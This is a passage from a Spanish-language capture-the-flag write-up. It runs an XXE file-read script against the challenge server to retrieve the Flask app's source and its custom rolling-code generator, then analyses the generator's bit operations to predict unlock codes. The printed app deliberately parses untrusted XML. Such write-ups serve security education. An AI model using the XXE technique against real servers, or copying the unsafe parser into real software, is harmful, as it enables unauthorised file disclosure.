<span class=code-white>Expires</span>: 0
</code></pre></div>
<p>Y por tanto, podemos deducir que el archivo principal del código fuente es <code>app.py</code>, <code>main.py</code>, <code>index.py</code> o <code>server.py</code>. Y para directorios, podemos probar con <code>/app</code> (bastante común en contenedores Docker). Finalmente, vemos que <code>/app/main.py</code> funciona. Este es el archivo:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>bash</span> xxe.sh http://35.190.155.168/c33a5d03b6 /app/main.py  
</code></pre></div>
<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>import</span> <span class="mtk8 mtku">json</span><span class=mtk1>,</span> <span class="mtk8 mtku">os</span><span class=mtk1>,</span> <span class="mtk8 mtku">time,</span> <span class="mtk8 mtku">xml</span><span class=mtk1>.</span><span class="mtk8 mtku">sax</span>

<span class=mtk5>from</span> <span class="mtk8 mtku">flask</span> <span class=mtk5>import</span> <span class="mtk8 mtku">Flask</span><span class=mtk1>,</span> <span class=mtk8>redirect</span><span class=mtk1>,</span> <span class=mtk1>request</span>
<span class=mtk5>from</span> <span class="mtk8 mtku">jinja2</span> <span class=mtk5>import</span> <span class="mtk8 mtku">Template</span>
<span class=mtk5>from</span> <span class="mtk8 mtku">cStringIO</span> <span class=mtk5>import</span> <span class="mtk8 mtku">StringIO</span>

<span class=mtk5>from</span> <span class=mtk1>rng</span> <span class=mtk5>import *</span>

<span class=mtk3>#</span> <span class=mtk3>^FLAG^xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx$FLAG$</span>

<span class=mtk1>flags</span> <span class=mtk5>=</span> <span class="mtk8 mtku">json</span><span class=mtk1>.</span><span class=mtk8>loads</span><span class=mtk1>(</span><span class="mtk8 mtku">os</span><span class=mtk1>.</span><span class=mtk8>getenv</span><span class=mtk1>(</span><span class=mtk4>'FLAGS'</span><span class=mtk1>))</span>
<span class="mtk8 mtku">os</span><span class=mtk1>.unsetenv(</span><span class=mtk4>'FLAGS'</span><span class=mtk1>)</span>

<span class=mtk1>app</span> <span class=mtk5>=</span> <span class="mtk8 mtku">Flask</span><span class=mtk1>(</span><span class=mtk1>__name__</span><span class=mtk1>)</span>

<span class=mtk1>templateCache</span> <span class=mtk5>=</span> <span class=mtk1>{}</span>
<span class="mtk7 mtki">def</span> <span class=mtk8>render</span><span class=mtk1>(</span><span class="mtk9 mtki">tpl</span><span class=mtk1>,</span> <span class=mtk5>**</span><span class="mtk9 mtki">kwargs</span><span class=mtk1>):</span>
    <span class=mtk5>if</span> <span class="mtk9 mtki">tpl</span> <span class=mtk5>not</span> <span class=mtk5>in</span> <span class=mtk1>templateCache</span><span class=mtk1>:</span>
        <span class=mtk1>templateCache</span><span class=mtk1>[</span><span class="mtk9 mtki">tpl</span><span class=mtk1>]</span> <span class=mtk5>=</span> <span class="mtk8 mtku">Template</span><span class=mtk1>(file(</span><span class=mtk4>'templates/</span><span class=mtk6>%s</span><span class=mtk4>.html'</span> <span class=mtk5>%</span> <span class="mtk9 mtki">tpl</span><span class=mtk1>).read())</span>
    <span class=mtk5>return</span> <span class=mtk1>templateCache</span><span class=mtk1>[</span><span class="mtk9 mtki">tpl</span><span class=mtk1>].render(</span><span class=mtk5>**</span><span class="mtk9 mtki">kwargs</span><span class=mtk1>)</span>

<span class=mtk8>@</span><span class=mtk1>app</span><span class=mtk8>.</span><span class=mtk8>after_request</span>
<span class="mtk7 mtki">def</span> <span class=mtk8>add_header</span><span class=mtk1>(</span><span class="mtk9 mtki">r</span><span class=mtk1>):</span>
    <span class="mtk9 mtki">r</span><span class=mtk1>.headers[</span><span class=mtk4>"Cache-Control"</span><span class=mtk1>]</span> <span class=mtk5>=</span> <span class=mtk4>"no-cache,</span> <span class=mtk4>no-store,</span> <span class=mtk4>must-revalidate"</span>
    <span class="mtk9 mtki">r</span><span class=mtk1>.headers[</span><span class=mtk4>"Pragma"</span><span class=mtk1>]</span> <span class=mtk5>=</span> <span class=mtk4>"no-cache"</span>
    <span class="mtk9 mtki">r</span><span class=mtk1>.headers[</span><span class=mtk4>"Expires"</span><span class=mtk1>]</span> <span class=mtk5>=</span> <span class=mtk4>"0"</span>
    <span class="mtk9 mtki">r</span><span class=mtk1>.headers[</span><span class=mtk4>'Cache-Control'</span><span class=mtk1>]</span> <span class=mtk5>=</span> <span class=mtk4>'public,</span> <span class=mtk4>max-age=0'</span>
    <span class=mtk5>return</span> <span class="mtk9 mtki">r</span>

<span class=mtk8>@</span><span class=mtk1>app</span><span class=mtk8>.</span><span class=mtk8>route</span><span class=mtk1>(</span><span class=mtk4>'/'</span><span class=mtk1>)</span>
<span class="mtk7 mtki">def</span> <span class=mtk8>index</span><span class=mtk1>():</span>
    <span class=mtk5>return</span> <span class=mtk8>render</span><span class=mtk1>(</span><span class=mtk4>'home'</span><span class=mtk1>)</span>

<span class=mtk8>@</span><span class=mtk1>app</span><span class=mtk8>.</span><span class=mtk8>route</span><span class=mtk1>(</span><span class=mtk4>'/unlock'</span><span class=mtk1>,</span> <span class="mtk9 mtki">methods</span><span class=mtk5>=</span><span class=mtk1>[</span><span class=mtk4>'POST'</span><span class=mtk1>])</span>
<span class="mtk7 mtki">def</span> <span class=mtk8>unlock</span><span class=mtk1>():</span>
    <span class=mtk1>code</span> <span class=mtk5>=</span> <span class="mtk7 mtki">int</span><span class=mtk1>(</span><span class=mtk1>request</span><span class=mtk1>.</span><span class=mtk8>form</span><span class=mtk1>[</span><span class=mtk4>'code'</span><span class=mtk1>])</span>
    <span class=mtk1>cur</span> <span class=mtk5>=</span> <span class=mtk8>next</span><span class=mtk1>(</span><span class=mtk6>26</span><span class=mtk1>)</span>
    <span class="mtk8 mtku">time</span><span class=mtk1>.sleep(</span><span class=mtk6>5</span><span class=mtk1>)</span>

    <span class=mtk5>if</span> <span class=mtk1>code</span> <span class=mtk5>==</span> <span class=mtk1>cur</span><span class=mtk1>:</span>
        <span class=mtk5>return</span> <span class=mtk4>'Unlocked</span> <span class=mtk4>successfully.</span>  <span class=mtk4>Flag:</span> <span class=mtk4>'</span> <span class=mtk5>+</span> <span class=mtk1>flags</span><span class=mtk1>[</span><span class=mtk6>1</span><span class=mtk1>]</span>
    <span class=mtk5>else</span><span class=mtk1>:</span>
        <span class=mtk5>return</span> <span class=mtk4>'Code</span> <span class=mtk4>incorrect.</span>  <span class=mtk4>Expected</span> <span class=mtk6>%08i</span><span class=mtk4>'</span> <span class=mtk5>%</span> <span class=mtk1>cur</span>

<span class=mtk8>@</span><span class=mtk1>app</span><span class=mtk8>.</span><span class=mtk8>route</span><span class=mtk1>(</span><span class=mtk4>'/admin'</span><span class=mtk1>)</span>
<span class="mtk7 mtki">def</span> <span class=mtk8>admin</span><span class=mtk1>():</span>
    <span class=mtk5>return</span> <span class=mtk8>render</span><span class=mtk1>(</span><span class=mtk4>'admin'</span><span class=mtk1>,</span> <span class="mtk9 mtki">location</span><span class=mtk5>=</span><span class=mtk1>location</span><span class=mtk1>)</span>

<span class=mtk1>location</span> <span class=mtk5>=</span> <span class=mtk4>'Front</span> <span class=mtk4>door'</span>

<span class=mtk8>@</span><span class=mtk1>app</span><span class=mtk8>.</span><span class=mtk8>route</span><span class=mtk1>(</span><span class=mtk4>'/get-config'</span><span class=mtk1>)</span>
<span class="mtk7 mtki">def</span> <span class=mtk8>getConfig</span><span class=mtk1>():</span>
    <span class=mtk5>return</span> <span class=mtk4>'&lt;?xml</span> <span class=mtk4>version="1.0"</span> <span class=mtk4>encoding="UTF-8"?&gt;&lt;config&gt;&lt;location&gt;</span><span class=mtk6>%s</span><span class=mtk4>&lt;/location&gt;&lt;/config&gt;'</span> <span class=mtk5>%</span> <span class=mtk1>location</span>  

<span class="mtk7 mtki">class</span> <span class="mtk8 mtku">Handler</span><span class=mtk1>(</span><span class="mtk8 mtku">xml</span><span class=mtk1>.</span><span class="mtk8 mtku">sax</span><span class=mtk1>.</span><span class="mtk8 mtku">ContentHandler</span><span class=mtk1>):</span>
    <span class="mtk7 mtki">def</span> <span class=mtk7>__init__</span><span class=mtk1>(</span><span class="mtk9 mtki">self</span><span class=mtk1>):</span>
        <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>location</span> <span class=mtk5>=</span> <span class=mtk6>None</span>
    <span class="mtk7 mtki">def</span> <span class=mtk8>startElement</span><span class=mtk1>(</span><span class="mtk9 mtki">self</span><span class=mtk1>,</span> <span class="mtk9 mtki">name</span><span class=mtk1>,</span> <span class="mtk9 mtki squiggly-inline-unnecessary">attrs</span><span class=mtk1>):</span>
        <span class=mtk5>if</span> <span class="mtk9 mtki">name</span> <span class=mtk5>==</span> <span class=mtk4>'location'</span><span class=mtk1>:</span>
            <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>location</span> <span class=mtk5>=</span> <span class=mtk4>''</span>
    <span class="mtk7 mtki">def</span> <span class=mtk8>endElement</span><span class=mtk1>(</span><span class="mtk9 mtki">self</span><span class=mtk1>,</span> <span class="mtk9 mtki">name</span><span class=mtk1>):</span>
        <span class=mtk5>if</span> <span class="mtk9 mtki">name</span> <span class=mtk5>==</span> <span class=mtk4>'location'</span><span class=mtk1>:</span>
            <span class=mtk5>global</span> <span class=mtk1>location</span>
            <span class=mtk1>location</span> <span class=mtk5>=</span> <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>location</span>
            <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>location</span> <span class=mtk5>=</span> <span class=mtk6>None</span>
    <span class="mtk7 mtki">def</span> <span class=mtk8>characters</span><span class=mtk1>(</span><span class="mtk9 mtki">self</span><span class=mtk1>,</span> <span class="mtk9 mtki">content</span><span class=mtk1>):</span>
        <span class=mtk5>if</span> <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>location</span> <span class=mtk5>is</span> <span class=mtk5>not</span> <span class=mtk6>None</span><span class=mtk1>:</span>
            <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>location</span> <span class=mtk5>+=</span> <span class="mtk9 mtki">content</span>

<span class=mtk8>@</span><span class=mtk1>app</span><span class=mtk8>.</span><span class=mtk8>route</span><span class=mtk1>(</span><span class=mtk4>'/set-config'</span><span class=mtk1>)</span>
<span class="mtk7 mtki">def</span> <span class=mtk8>setConfig</span><span class=mtk1>():</span>
    <span class=mtk1>data</span> <span class=mtk5>=</span> <span class=mtk1>request</span><span class=mtk1>.</span><span class=mtk8>args</span><span class=mtk1>[</span><span class=mtk4>'data'</span><span class=mtk1>]</span>
    <span class=mtk1>parser</span> <span class=mtk5>=</span> <span class="mtk8 mtku">xml</span><span class=mtk1>.</span><span class="mtk8 mtku">sax</span><span class=mtk1>.</span><span class=mtk8>make_parser</span><span class=mtk1>()</span>
    <span class=mtk1>parser</span><span class=mtk1>.setContentHandler(</span><span class="mtk8 mtku">Handler</span><span class=mtk1>())</span>
    <span class=mtk1>parser</span><span class=mtk1>.parse(</span><span class="mtk8 mtku">StringIO</span><span class=mtk1>(</span><span class=mtk1>data</span><span class=mtk1>))</span>
    <span class=mtk5>return</span> <span class=mtk8>redirect</span><span class=mtk1>(</span><span class=mtk4>'admin'</span><span class=mtk1>)</span>

<span class=mtk1>app</span><span class=mtk1>.</span><span class=mtk8>run</span><span class=mtk1>(</span><span class="mtk9 mtki">host</span><span class=mtk5>=</span><span class=mtk4>'0.0.0.0'</span><span class=mtk1>,</span> <span class="mtk9 mtki">port</span><span class=mtk5>=</span><span class=mtk6>80</span><span class=mtk1>)</span>
</code></pre></div>
<p>Este archivo contiene un comentario con la primera <em>flag</em>.</p>
<p>Ahora podemos analizar la función que gestiona el código numérico de la página principal:</p>
<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk8>@</span><span class=mtk1>app</span><span class=mtk8>.</span><span class=mtk8>route</span><span class=mtk1>(</span><span class=mtk4>'/unlock'</span><span class=mtk1>,</span> <span class="mtk9 mtki">methods</span><span class=mtk5>=</span><span class=mtk1>[</span><span class=mtk4>'POST'</span><span class=mtk1>])</span>
<span class="mtk7 mtki">def</span> <span class=mtk8>unlock</span><span class=mtk1>():</span>
    <span class=mtk1>code</span> <span class=mtk5>=</span> <span class="mtk7 mtki">int</span><span class=mtk1>(</span><span class=mtk1>request</span><span class=mtk1>.</span><span class=mtk8>form</span><span class=mtk1>[</span><span class=mtk4>'code'</span><span class=mtk1>])</span>
    <span class=mtk1>cur</span> <span class=mtk5>=</span> <span class=mtk8>next</span><span class=mtk1>(</span><span class=mtk6>26</span><span class=mtk1>)</span>
    <span class="mtk8 mtku">time</span><span class=mtk1>.sleep(</span><span class=mtk6>5</span><span class=mtk1>)</span>

    <span class=mtk5>if</span> <span class=mtk1>code</span> <span class=mtk5>==</span> <span class=mtk1>cur</span><span class=mtk1>:</span>
        <span class=mtk5>return</span> <span class=mtk4>'Unlocked</span> <span class=mtk4>successfully.</span>  <span class=mtk4>Flag:</span> <span class=mtk4>'</span> <span class=mtk5>+</span> <span class=mtk1>flags</span><span class=mtk1>[</span><span class=mtk6>1</span><span class=mtk1>]</span>  
    <span class=mtk5>else</span><span class=mtk1>:</span>
        <span class=mtk5>return</span> <span class=mtk4>'Code</span> <span class=mtk4>incorrect.</span>  <span class=mtk4>Expected</span> <span class=mtk6>%08i</span><span class=mtk4>'</span> <span class=mtk5>%</span> <span class=mtk1>cur</span>
</code></pre></div>
<p>La función llamada <code>next</code> no es la que viene con Python. De hecho, se está tomando de <code>rng</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>from</span> <span class=mtk1>rng</span> <span class=mtk5>import *</span>  
</code></pre></div>
<p>Por tanto, tiene que existir un archivo llamado <code>rng.py</code>, que es este:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>bash</span> xxe.sh http://35.190.155.168/c33a5d03b6 /app/rng.py  
</code></pre></div>
<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>import</span> <span class="mtk8 mtku">random</span>


<span class="mtk7 mtki">def</span> <span class=mtk8>setup</span><span class=mtk1>(</span><span class="mtk9 mtki">seed</span><span class=mtk1>):</span>
    <span class=mtk5>global</span> <span class=mtk1>state</span>

    <span class=mtk1>state</span> <span class=mtk5>=</span> <span class=mtk6>0</span>

    <span class=mtk5>for</span> <span class="mtk1 squiggly-inline-unnecessary">i</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk6>16</span><span class=mtk1>):</span>
        <span class=mtk1>cur</span> <span class=mtk5>=</span> <span class="mtk9 mtki">seed</span> <span class=mtk5>&amp;</span> <span class=mtk6>3</span>
        <span class="mtk9 mtki">seed</span> <span class=mtk5>&gt;&gt;=</span> <span class=mtk6>2</span>
        <span class=mtk1>state</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class=mtk1>state</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk6>4</span><span class=mtk1>)</span> <span class=mtk5>|</span> <span class=mtk1>((</span><span class=mtk1>state</span> <span class=mtk5>&amp;</span> <span class=mtk6>3</span><span class=mtk1>)</span> <span class=mtk5>^</span> <span class=mtk1>cur</span><span class=mtk1>)</span>
        <span class=mtk1>state</span> <span class=mtk5>|=</span> <span class=mtk1>cur</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk6>2</span>


<span class="mtk7 mtki">def</span> <span class=mtk8>next</span><span class=mtk1>(</span><span class="mtk9 mtki">bits</span><span class=mtk1>):</span>
    <span class=mtk5>global</span> <span class=mtk1>state</span>

    <span class=mtk1>ret</span> <span class=mtk5>=</span> <span class=mtk6>0</span>

    <span class=mtk5>for</span> <span class=mtk1>_</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class="mtk9 mtki">bits</span><span class=mtk1>):</span>
        <span class=mtk1>ret</span> <span class=mtk5>&lt;&lt;=</span> <span class=mtk6>1</span>
        <span class=mtk1>ret</span> <span class=mtk5>|=</span> <span class=mtk1>state</span> <span class=mtk5>&amp;</span> <span class=mtk6>1</span>

        <span class=mtk1>state</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class=mtk1>state</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk5>^</span> <span class=mtk1>(</span><span class=mtk1>state</span> <span class=mtk5>&gt;&gt;</span> <span class=mtk6>61</span><span class=mtk1>)</span>
        <span class=mtk1>state</span> <span class=mtk5>&amp;=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>FFFFFFFFFFFFFFFF</span>
        <span class=mtk1>state</span> <span class=mtk5>^=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>FFFFFFFFFFFFFFFF</span>

        <span class=mtk5>for</span> <span class=mtk1>j</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk6>64</span><span class=mtk1>,</span> <span class=mtk6>4</span><span class=mtk1>):</span>
            <span class=mtk1>cur</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class=mtk1>state</span> <span class=mtk5>&gt;&gt;</span> <span class=mtk1>j</span><span class=mtk1>)</span> <span class=mtk5>&amp;</span> <span class="mtk7 mtki">0x</span><span class=mtk6>F</span>
            <span class=mtk1>cur</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class=mtk1>cur</span> <span class=mtk5>&gt;&gt;</span> <span class=mtk6>3</span><span class=mtk1>)</span> <span class=mtk5>|</span> <span class=mtk1>((</span><span class=mtk1>cur</span> <span class=mtk5>&gt;&gt;</span> <span class=mtk6>2</span><span class=mtk1>)</span> <span class=mtk5>&amp;</span> <span class=mtk6>2</span><span class=mtk1>)</span> <span class=mtk5>|</span> <span class=mtk1>((</span><span class=mtk1>cur</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk6>3</span><span class=mtk1>)</span> <span class=mtk5>&amp;</span> <span class=mtk6>8</span><span class=mtk1>)</span> <span class=mtk5>|</span> <span class=mtk1>((</span><span class=mtk1>cur</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk6>2</span><span class=mtk1>)</span> <span class=mtk5>&amp;</span> <span class=mtk6>4</span><span class=mtk1>)</span>  
            <span class=mtk1>state</span> <span class=mtk5>^=</span> <span class=mtk1>cur</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk1>j</span>

    <span class=mtk5>return</span> <span class=mtk1>ret</span>


<span class=mtk8>setup</span><span class=mtk1>((</span><span class="mtk8 mtku">random</span><span class=mtk1>.</span><span class=mtk8>randrange</span><span class=mtk1>(</span><span class="mtk7 mtki">0x</span><span class=mtk6>10000</span><span class=mtk1>)</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk6>16</span><span class=mtk1>)</span> <span class=mtk5>|</span> <span class="mtk8 mtku">random</span><span class=mtk1>.</span><span class=mtk8>randrange</span><span class=mtk1>(</span><span class="mtk7 mtki">0x</span><span class=mtk6>10000</span><span class=mtk1>))</span>
</code></pre></div>
<p>Este archivo se utiliza para generar códigos evolutivos (<em>rolling codes</em>). Debemos obtener el siguiente código dados uno o más códigos anteriores, o por lo menos extraer la semilla original para poder generar más códigos evolutivos.</p>
<p>El <em>script</em> utiliza tres variables principalmente:</p>
<ul>
<li><code>seed</code>: Es la semilla inicial. Es completamente aleatoria y se calcula así:</li>
</ul>
<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>seed </span><span class=mtk5>=</span> (</span><span class="mtk8 mtku">random</span><span class=mtk1>.</span><span class=mtk8>randrange</span><span class=mtk1>(</span><span class="mtk7 mtki">0x</span><span class=mtk6>10000</span><span class=mtk1>)</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk6>16</span><span class=mtk1>)</span> <span class=mtk5>|</span> <span class="mtk8 mtku">random</span><span class=mtk1>.</span><span class=mtk8>randrange</span><span class=mtk1>(</span><span class="mtk7 mtki">0x</span><span class=mtk6>10000</span><span class=mtk1>)</span>  
</code></pre></div>
<ul>
<li><code>ret</code>: Es el siguiente código evolutivo. Se calcula utilizando una variable <code>state</code>. Básicamente, se toma el último bit de <code>state</code> y se pone al final de <code>ret</code> durante 26 iteraciones. Sin embargo, <code>state</code> cambia en cada iteración:</li>
</ul>
<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>ret</span> <span class=mtk5>=</span> <span class=mtk6>0</span>

<span class=mtk5>for</span> <span class=mtk1>_</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk6>26</span><span class=mtk1>):</span>
    <span class=mtk1>ret</span> <span class=mtk5>&lt;&lt;=</span> <span class=mtk6>1</span>
    <span class=mtk1>ret</span> <span class=mtk5>|=</span> <span class=mtk1>state</span> <span class=mtk5>&amp;</span> <span class=mtk6>1</span>  

    <span class=mtk3># Changes in state</span>
</code></pre></div>
<ul>
<li><code>state</code>: Se genera inicialmente mediante la semilla <code>seed</code> como:</li>
</ul>
<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>state</span> <span class=mtk5>=</span> <span class=mtk6>0</span>

<span class=mtk5>for</span> <span class="mtk1 squiggly-inline-unnecessary">i</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk6>16</span><span class=mtk1>):</span>
    <span class=mtk1>cur</span> <span class=mtk5>=</span> <span class="mtk9 mtki">seed</span> <span class=mtk5>&amp;</span> <span class=mtk6>3</span>
    <span class="mtk9 mtki">seed</span> <span class=mtk5>&gt;&gt;=</span> <span class=mtk6>2</span>
    <span class=mtk1>state</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class=mtk1>state</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk6>4</span><span class=mtk1>)</span> <span class=mtk5>|</span> <span class=mtk1>((</span><span class=mtk1>state</span> <span class=mtk5>&amp;</span> <span class=mtk6>3</span><span class=mtk1>)</span> <span class=mtk5>^</span> <span class=mtk1>cur</span><span class=mtk1>)</span>  
    <span class=mtk1>state</span> <span class=mtk5>|=</span> <span class=mtk1>cur</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk6>2</span>
</code></pre></div>
<p>Pero esto no es útil porque <code>seed</code> es aleatoria. Vemos que <code>state</code> cambia en cada llamada a <code>next</code>, y de hecho, cambia en cada una de las 26 iteraciones de la llamada a <code>next</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>for</span> <span class=mtk1>_</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk6>26</span><span class=mtk1>):</span>
    <span class=mtk3># Changes in ret</span>

    <span class=mtk1>state</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class=mtk1>state</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk5>^</span> <span class=mtk1>(</span><span class=mtk1>state</span> <span class=mtk5>&gt;&gt;</span> <span class=mtk6>61</span><span class=mtk1>)</span>
    <span class=mtk1>state</span> <span class=mtk5>&amp;=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>FFFFFFFFFFFFFFFF</span>
    <span class=mtk1>state</span> <span class=mtk5>^=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>FFFFFFFFFFFFFFFF</span>

    <span class=mtk5>for</span> <span class=mtk1>j</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk6>64</span><span class=mtk1>,</span> <span class=mtk6>4</span><span class=mtk1>):</span>
        <span class=mtk1>cur</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class=mtk1>state</span> <span class=mtk5>&gt;&gt;</span> <span class=mtk1>j</span><span class=mtk1>)</span> <span class=mtk5>&amp;</span> <span class="mtk7 mtki">0x</span><span class=mtk6>F</span>
        <span class=mtk1>cur</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class=mtk1>cur</span> <span class=mtk5>&gt;&gt;</span> <span class=mtk6>3</span><span class=mtk1>)</span> <span class=mtk5>|</span> <span class=mtk1>((</span><span class=mtk1>cur</span> <span class=mtk5>&gt;&gt;</span> <span class=mtk6>2</span><span class=mtk1>)</span> <span class=mtk5>&amp;</span> <span class=mtk6>2</span><span class=mtk1>)</span> <span class=mtk5>|</span> <span class=mtk1>((</span><span class=mtk1>cur</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk6>3</span><span class=mtk1>)</span> <span class=mtk5>&amp;</span> <span class=mtk6>8</span><span class=mtk1>)</span> <span class=mtk5>|</span> <span class=mtk1>((</span><span class=mtk1>cur</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk6>2</span><span class=mtk1>)</span> <span class=mtk5>&amp;</span> <span class=mtk6>4</span><span class=mtk1>)</span>  
        <span class=mtk1>state</span> <span class=mtk5>^=</span> <span class=mtk1>cur</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk1>j</span>
</code></pre></div>
<p>Primero, tenemos esta operación (utilizando un número de 64 bits como una lista de bits):</p>
<p>$$
\mathrm{state} = [s_{63}, s_{62}, s_{61}, s_{60}, \dots, s_2, s_1, s_0]
$$</p>
<p>$$
\mathrm{state} = [s_{62}, s_{61}, s_{60}, \dots, s_2, s_1, s_0, 0] \hat{} [0, 0, 0, \dots, 0, s_{63}, s_{62}, s_{61}]
$$</p>
<p>$$
\mathrm{state} = [s_{62}, s_{61}, s_{60}, \dots, s_2, (s_1 \hat{} s_{63}), (s_0 \hat{} s_{62}), s_{61}]
$$</p>
<p>$$
\mathrm{state} = [\overline{s_{62}}, \overline{s_{61}}, \overline{s_{60}}, \dots, \overline{s_2}, \overline{(s_1 \hat{} s_{63})}, \overline{(s_0 \hat{} s_{62})}, \overline{s_{61}}]
$$</p>
<p>Y ahora tenemos operaciones por cada 4 bits de <code>state</code> (copiados en la variable <code>cur</code>). Por ejemplo:</p>
<p>$$
\mathrm{cur} = [s_3, s_2, s_1, s_0]
$$</p>
<p>$$
\mathrm{cur} = [0, 0, 0, s_3] \quad|\quad [0, 0, s_3, 0] \quad|\quad [s_0, 0, 0, 0] \quad|\quad [0, s_0, 0, 0]
$$</p>
<p>$$
\mathrm{cur} = [s_0, s_0, s_3, s_3]
$$</p>
<p>$$
\mathrm{state}[3..0] = [s_3, s_2, s_1, s_0] \hat{} [s_0, s_0, s_3, s_3]
$$</p>
<p>Por lo que <code>state</code> cambia así:</p>
<p>$$
\mathrm{state}[3..0] = [(s_3 \hat{} s_0), (s_2 \hat{} s_0), (s_1 \hat{} s_3), (s_0 \hat{} s_3)]
$$</p>
<p>Y por tanto, la variable <code>state</code> completa cambia de esta manera (nótese que en cada cuarteto, el primer bit y el último son iguales):</p>
<p>$$
\mathrm{state}[63..60] = [(s_{63} \hat{} s_{60}), (s_{62} \hat{} s_{60}), (s_{61} \hat{} s_{63}), (s_{60} \hat{} s_{63})]
$$</p>
<p>$$
\mathrm{state}[59..56] = [(s_{59} \hat{} s_{56}), (s_{58} \hat{} s_{56}), (s_{59} \hat{} s_{59}), (s_{56} \hat{} s_{59})]
$$</p>
<p>$$
\dots
$$</p>
<p>$$
\mathrm{state}[3..0] = [(s_3 \hat{} s_0), (s_2 \hat{} s_0), (s_1 \hat{} s_3), (s_0 \hat{} s_3)]
$$</p>
<p>Finalmente, si unimos las dos etapas del cambio de <code>state</code>, tenemos lo siguiente:</p>
<p>$$
\mathrm{state} = [s_{63}, s_{62}, s_{61}, s_{60}, \dots, s_2, s_1, s_0]
$$</p>
<p>Y el siguiente <code>state</code> será:</p>
<p>$$
\mathrm{state} = [(\overline{s_{62}} \hat{} \overline{s_{59}}), (\overline{s_{61}} \hat{} \overline{s_{59}}), (\overline{s_{60}} \hat{} \overline{s_{62}}), (\overline{s_{59}} \hat{} \overline{s_{62}}),
$$</p>
<p>$$
(\overline{s_{58}} \hat{} \overline{s_{55}}), (\overline{s_{57}} \hat{} \overline{s_{55}}), (\overline{s_{56}} \hat{} \overline{s_{58}}), (\overline{s_{55}} \hat{} \overline{s_{58}}),
$$</p>
<p>$$
\dots
$$</p>
<p>$$
(\overline{s_6} \hat{} \overline{s_3}), (\overline{s_5} \hat{} \overline{s_3}), (\overline{s_4} \hat{} \overline{s_6}), (\overline{s_3} \hat{} \overline{s_6}),
$$</p>
<p>$$
(\overline{s_2} \hat{} \overline{s_{61}}), (\overline{(s_1 \hat{} s_{63})} \hat{} \overline{s_{61}}), (\overline{(s_0 \hat{} s_{62})} \hat{} \overline{s_2}), (\overline{s_{61}} \hat{} \overline{s_2})]
$$</p>
